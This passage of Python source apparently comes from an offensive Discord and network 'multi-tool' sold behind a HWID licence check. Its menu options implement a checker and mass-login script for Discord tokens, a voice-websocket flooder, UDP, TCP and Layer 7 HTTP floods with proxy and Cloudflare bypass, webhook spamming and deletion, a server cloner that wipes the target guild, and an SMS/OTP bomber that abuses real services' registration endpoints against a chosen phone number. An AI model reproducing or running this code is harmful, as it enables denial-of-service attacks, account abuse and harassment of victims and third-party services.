                        filtered = filter_tokens(tokens)
                        filtr = len(filtered)
                        for token in filtered:
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{token} Valid')
                                checked.append(token)
                            else:
                                print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{token} Invalid')
                    if len(checked) > 0:
                        save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Tokens saved to {name}.txt file!')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, cant open tokens.txt file...... :(!')

        start = input('Press Enter to proceed: ')
        start = manager()

        time.sleep(5)
        exit = input('press any key: ')
        exit = clear()
        exit = manu()

    if akamata == '9':
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Online')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Do Not Disturb')
        print(f'{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Idle')
        onlinr = int(input('[?]> '))

        tuk = []

        tokens = open("tokens.txt", "r").read().splitlines()

        asc = asyncio.new_event_loop()
        asyncio.set_event_loop(asc)

        if onlinr == 1:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.online)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
        if onlinr == 2:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.do_not_disturb)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')
        if onlinr == 3:
            for token in tokens:
                bottuk = discord.Client(status=discord.Status.idle)
                asc.create_task(bottuk.start(token, bot=False))
                tuk.append(bottuk)
                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done')

        threading.Thread(target=asc.run_forever).start()

        time.sleep(5)
        exit = input('press any key: ')
        exit = clear()
        exit = manu()

    if akamata == '10':
        ws_server = input("websocket: ")
        serverid = input("server id: ")
        myuid = input("your user id: ")
        vid = input("victim id (anyone in the vc): ")
        sessionid = input("session id: ")
        tokenn = input("token (not auth): ")
        def fatman():
            while True:
                try:
                    ws = websocket.create_connection(f"{ws_server}",origin=f"https://discord.com")
                    ws.send(js2.dumps({"op":0,"d":{"server_id":f"{serverid}","user_id":f"{myuid}","session_id":f"{sessionid}","token":f"{tokenn}","video":True,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}},separators=(",", ":")).encode("UTF-8"))
                    ws.send(js2.dumps({"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":True,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}},separators=(",", ":")).encode("UTF-8"))
                    ws.send(js2.dumps({"op":5,"d":{"speaking":9223372036854775807,"delay":-1,"ssrc":9223372036854775807}},separators=(",", ":")).encode("UTF-8"))
                    ws.send(js2.dumps({"op":3,"d":-1},separators=(",", ":")).encode("UTF-8"))
                    print("Bell </3 Ice")
                    print("Ice <3 Pleng")
                    ws.close()
                except Exception as e:
                    print(e)
                    pass

        threads = []

        for i in range(300):
            t = threading.Thread(target=fatman)
            t.daemon = True
            threads.append(t)

        for i in range(300):
            threads[i].start()

        for i in range(300):
            threads[i].join()

    if akamata == '11':
        colorama.init()
        print("UDP FLOOD")
        ip = str(input(" IP:"))
        port = int(input(" PORT:"))

        def run2():
            data = random._urandom(1024, 60000)
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect((ip,port))
                    s.send(data)
                    for x in range(100):
                        s.send(data)
                    print(Fore.Blue + '[UDP]' + Fore.GREEN + '> Send Packet')
                except:
                    s.close()
                    print(Fore.BLUE + '[UDP]' + Fore.GREEN + '> Send Packet')

        for y in range(100):
                th = threading.Thread(target = run2)
                th.start()

    if akamata == '12':
        colorama.init()

        print("TCP FLOOD")
        ip = str(input(" IP:"))
        port = int(input(" PORT:"))

        def run2():
            data = random._urandom(1024)
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip,port))
                    s.send(data)
                    for x in range(100):
                        s.send(data)
                    print(Fore.Blue + '[TCP]' + Fore.GREEN + '> Send Packet')
                except:
                    s.close()
                    print(Fore.BLUE + '[TCP]' + Fore.GREEN + '> Send Packet')

        for y in range(100):
                th = threading.Thread(target = run2)
                th.start()
          
    if akamata == '13':
        useragen= open("useragen.txt","r",encoding="utf8").read().splitlines()
        useragen = choice(useragen)




        def main():
            scraper = cloudscraper.create_scraper()
            proxies = open("proxies.txt","r",encoding="utf8").read().splitlines()
            proxies = choice(proxies)
            print(proxies)

            if CC_XX2 == "1":
                while True:
                    CC_XX22 = httpx.get(K__XX,useragen=useragen).status_code
                    if CC_XX22 == 200:
                        print(' Httpx requests 200 ')
                    elif CC_XX22 == 502:
                        print(' Httpx requests 502 ') 

            if CC_XX2 == "2":
                while True:
                    ___X2 = httpx.get(K__XX,proxies={"https://":f"https://{choice(proxies)}"}).status_code
                    if ___X2 == 200:
                        print(" Google Down 200")
                    elif ___X2 == 502:
                        print(" Google Down 502 ")
                
            if CC_XX2 == "3":
                while True:
                    C__X23 = scraper.get(K__XX,proxies={"https://":f"https://{choice(proxies)}"}).status_code
                    if C__X23 == 200:
                        print("  Bypass Cloudflare 200 ")
                    elif C__X23 == 502:
                        print("  Bypass Cloudflare 502 ")  
            main()
            

        if __name__ == "__main__":
            os.system('cls')
            os.system('title DDOS Layer 7')
            print(f'''
              
                        {Fore.LIGHTMAGENTA_EX}[{Fore.RED}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} 1 | Httpx requests
                        {Fore.LIGHTMAGENTA_EX}[{Fore.RED}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} 2 | Bypass Proxies
                        {Fore.LIGHTMAGENTA_EX}[{Fore.RED}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} 3 | Bypass Cf 
            ''')
            CC_XX2 = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}Function : ")
            K__XX = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RED}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} URL : ")
            OO__IOS = int(input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RED}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Thread : "))
            for x in range(OO__IOS):
                while True:
                    threading.Thread(target=main).start()

    if akamata == '14':
        msg = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Message: ")
        webhook = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} WebHook URL: ")
        def spam(msg, webhook):
            while True:
                try:
                    data = requests.post(webhook, json={'content': msg})
                    if data.status_code == 204:
                        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sent MSG {msg}")
                except:
                    print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}-{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Bad Webhook :" + webhook)
                    time.sleep(5)
                    exit()
        kingman_top = 1
        while kingman_top == 1:
            spam(msg, webhook)
    
    if akamata == '15':
        def nuker():
            start = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}] Webhook Url>")
            hook = Webhook(start)
            hook.send("This webhook has forcefully been deleted :joy:")
            x = requests.delete(start)
        nuker()

    if akamata == '16':
        client = discord.Client()
        input_guild_id = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.GREEN}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Guild id>")  # <-- input guild id
        output_guild_id = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.GREEN}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Copy to > ")
        token = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Your Token (Not Token Bot) >")  # <-- your token
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Please wait")

        @client.event
        async def on_connect():
            extrem_map = {}
            guild = client.get_guild(int(input_guild_id))
            new_guild = client.get_guild(int(output_guild_id))
            for role in new_guild.roles:
                try:
                    await role.delete()
                except:
                    continue
            list_roles = []
            for role in guild.roles:
                list_roles.insert(0, role)
            for role in list_roles:
                await new_guild.create_role(name=role.name, permissions=role.permissions, colour=role.colour, hoist=role.hoist,
                                            mentionable=role.mentionable)

            for channel in new_guild.categories:
                await channel.delete()

            for channel in new_guild.voice_channels:
                await channel.delete()

            for channel in new_guild.text_channels:
                await channel.delete()

            for cat in guild.categories:
                new_cat = await new_guild.create_category_channel(name=cat.name, overwrites=cat.overwrites)
                await new_cat.edit(position=int(cat.position), nsfw=cat.is_nsfw())
                extrem_map[str(cat.id)] = new_cat.id

            for channel in guild.text_channels:
                print(channel)
                if channel.category_id is not None:
                    new_cat_id = extrem_map.get(str(channel.category_id))

                    new_txt_chan = await client.fetch_channel(int(new_cat_id))
                    await new_txt_chan.create_text_channel(name=channel.name, topic=channel.topic, position=channel.position,
                                                        slowmode_delay=channel.slowmode_delay, nsfw=channel.is_nsfw(),
                                                        overwrites=channel.overwrites)
                else:
                    await new_guild.create_text_channel(name=channel.name, topic=channel.topic, position=channel.position,
                                                        slowmode_delay=channel.slowmode_delay, nsfw=channel.is_nsfw(),
                                                        overwrites=channel.overwrites)

            for channel in guild.voice_channels:
                if channel.category_id is not None:
                    new_cat_id = extrem_map.get(str(channel.category_id))
                    new_voc_chan = await client.fetch_channel(int(new_cat_id))
                    await new_voc_chan.create_voice_channel(name=channel.name, position=channel.position,
                                                            user_limit=channel.user_limit, overwrites=channel.overwrites)
                else:
                    await new_guild.create_voice_channel(name=channel.name, position=channel.position,
                                                        user_limit=channel.user_limit, overwrites=channel.overwrites)
            await client.close()


        client.run(token, bot=False)

    if akamata == '17':
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SMS Spammer")

        num = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} PhoneNumber >")
        n = input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Amount >")
        headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
        def shopat(phone):
            s=Session()
            s.headers.update(headers)
            token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
            d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
            if d == 200:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - ShopAt24 ")
            else : 
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - ShopAt24 ")

        def p1112(phone):
            d=post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
            if d == 200:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - 1112 ")
            else : 
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - 1112")

        def p1112v2(phone):
            d=post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
            if d == 200:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - 1112")
            else : 
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - 1112")

        def okru(phone):
            s=Session()
            s.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
            s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
            s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
            print("SPAM SUCCESS - okru")

        def findclone(phone):
            d=get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
            if d.get("Error",False) == "Wait for timeout":
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - findclone")
            else :
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - findclone")

        def unacademy(phone):
            d=post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers=headers).json()
            if d.get("error_code",False):
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - unacademy")
            else :
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - unacademy")

        def icq(phone):
            post(f"https://u.icq.net/api/v4/rapi",json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},headers=headers)
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - icq ")

        def ig_token():
            d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
            d=search("csrftoken=(.*);",d).group(1).split(";")
            return d[0],d[10].replace(" Secure, ig_did=","")

        def instagram(phone):
            token,_=ig_token()
            d=post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
            if d["status"] == "ok":
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - instagram ")
            else:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - instagram ")

        def instagramv2(phone):

            token,cid=ig_token()
            d=post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
            if d["status"] == "ok":
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - instagram")
            else:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - instagram")

        def yandex(phone):
            d=post("https://taxi.yandex.kz/3.0/launch/",json={},headers=headers).json()
            d=post("https://taxi.yandex.kz/3.0/auth/",json={"id": d["id"], "phone": f"+66{phone[1:]}"},headers=headers).text
            if d == "{}":
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - yandex ")
            else:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - yandex ")
        def homepro(phone):
            d=post("https://www.homepro.co.th/service/user/profile/otp.jsp",data=f"action=otp&user_mobile_number={phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","x-csrf-token": "AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "h11e_uuid=5da6d569-5a72-4014-afef-40990862f26e; ltcid=4ac7dc78-ae73-4617-ba28-75b31ed3bc9f; ltsid=9b139725-fc38fbcc; _gid=GA1.3.1373861600.1635677257; _fbp=fb.2.1635677258036.1072722582; h11e_data1=ZTE1MWFkY2ZjMDk3ODk1MzhiMzk1MzM0OTc5NDMzMmIzOWEyOGVhNWU3NWU1NzQzODJhODMyM2U1MWI3MGQ0Yzg1MWM4MGEzYjJmMjUwYTUxMThjZGU2YTQ3NzVkNDMy; h11e_lang=th; _dc_gtm_UA-112826849-3=1; h11e_user=N2NlM2E4ODNkYjQxNjcwNTg3YzgxN2UwZWJiMDFkNmU0ZWUzM2M0M2U2YTJmNTkxMzA2NjYxYzU2MTFiNjFjNw==; h11e_csrf=AaqCrWeoDAPdJqmFtCnSCJN8a1mECsPB; JSESSIONID=06E6906132FE92B731D49BFD2F00877D; _ga=GA1.3.106485705.1635677257; _ga_RMXSTMQMK7=GS1.1.1635677253.1.1.1635677348.0"}).json()
            if d["msgtype"] == "success":
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - homepro ")
            else:
                print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTRED_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} SPAM SUCCESS - homepro ")


        def loop(pho):
            for _ in range(2):
                exec.submit(okru,pho) 
                exec.submit(findclone,pho) 
                exec.submit(unacademy,pho) 
                exec.submit(icq,pho) 
                exec.submit(instagram,pho) 
                exec.submit(instagramv2,pho) 
                exec.submit(yandex,pho) 
                sleep(10)
        if __name__ == "__main__":
            exec=ThreadPoolExecutor(max_workers=10000)
            print("  SPAM SMS 9API")
            pho = num
            i = n
            exec.submit(loop,pho)
            for _ in range(i):
                exec.submit(shopat,pho) 
                exec.submit(p1112,pho) 
                exec.submit(p1112v2,pho) 
                exec.submit
    

class hwid:
    def __init__(self,url):
        self.db = requests.get(url).text
    def gethwid(self):
        return str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
    def check(self,hwid=None):
        if hwid == None: hwid = self.gethwid()

        if hwid in self.db:
            return True
        else:
            return False

if __name__ == "__main__":
    obj = hwid("HWID")
    if obj.check():
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.LIGHTYELLOW_EX}HWID Successful{Fore.RESET}")
        time.sleep(1)
        manu()
    else :
        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RED}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Please contact the creator in Discord Link | {Fore.BLUE}https://discord.gg/z3zM7xjA7w{Fore.RESET}")
        input(f"{Fore.LIGHTMAGENTA_EX}[{Fore.RED}info{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} HWID not found ( your hwid : {Fore.LIGHTYELLOW_EX}{obj.gethwid()}{Fore.RESET} )")